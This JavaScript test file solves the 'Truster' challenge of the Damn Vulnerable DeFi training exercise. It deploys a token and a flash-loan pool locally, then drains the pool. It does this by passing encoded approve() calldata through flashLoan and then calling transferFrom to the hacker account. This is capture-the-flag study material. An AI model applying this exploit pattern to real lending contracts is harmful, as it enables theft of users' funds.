const{expect} = require("chai");
const{expectRevert} = require("@openzeppelin/test-helpers");
const IERC20 = require("@openzeppelin/contracts/build/contracts/IERC20.json").abi;




describe("Truster Damn Vulnerable DEFI", function(){

    let owner, account1, hacker,
        TrusterLenderPool, truster,
        DamnValuableToken,DVT;

    before(async()=>{

        [owner, account1, hacker] = await ethers.getSigners();


        //Deploy DamnValuableToken
        DamnValuableToken = await ethers.getContractFactory("DamnValuableToken");
        DVT = await DamnValuableToken.deploy();
        await DVT.deployed();


        //Deploy TrusterLenderPool
        TrusterLenderPool = await ethers.getContractFactory("TrusterLenderPool");
        truster = await TrusterLenderPool.deploy(DVT.address);
        await truster.deployed();


        await DVT.transfer(truster.address, ethers.utils.parseEther("1000000"));

        let DVTAmountInTrusterLender = await DVT.balanceOf(truster.address);
        console.log("");
        console.log("DVT in Truster Pool:", (DVTAmountInTrusterLender/10**18).toString(), "DVT");
        console.log("");
    });



    //We should pass a bytes of data to the flshloan function to approve DVT tokens to ourselfs
    //After that we only need to transferFrom the pool to the hacker address.
    it("Exploit",async()=>{

        let amountDVTInTruster = await DVT.balanceOf(truster.address);


        let DVTTokenInterface = new ethers.utils.Interface(["function approve(address,uint)"]);
        let data = DVTTokenInterface.encodeFunctionData("approve",[hacker.address, amountDVTInTruster]);


        await truster.connect(hacker).flashLoan(0, hacker.address, DVT.address, data);

        await DVT.connect(hacker).transferFrom(truster.address, hacker.address, amountDVTInTruster);

        let DVTBalanceTrusterAfterExploit = await DVT.balanceOf(truster.address);
        console.log("DVT in Truster Pool After Exploit:", (DVTBalanceTrusterAfterExploit/10**18).toString(), "DVT");

        let DVTBalanceHackerAfterExploit = await DVT.balanceOf(hacker.address);
        console.log("Hacker DVT Balance After Exploit:", (DVTBalanceHackerAfterExploit/10**18).toString(), "DVT");
    });

})